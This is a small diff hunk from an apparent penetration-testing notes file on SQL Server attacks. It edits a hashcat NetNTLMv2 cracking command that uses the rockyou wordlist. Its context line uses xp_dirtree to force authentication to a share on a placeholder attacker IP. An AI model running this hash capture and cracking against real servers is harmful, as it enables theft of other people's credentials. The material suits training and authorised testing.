@@ -276,7 +276,7 @@ EXEC master..xp_dirtree '\\<ATTACKER_IP>\myshare', 1, 1;
 ```
 
 ```bash
-hashcat -m 5600 'jason::SQL01:bd7f162c24a39a0f:94DF80C5ABB...SNIP...000000' /usr/share/wordlists/rockyou.txt
+hashcat -m 5600 'file containing the hash.txt' ~/Desktop/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
 
 ### File Read
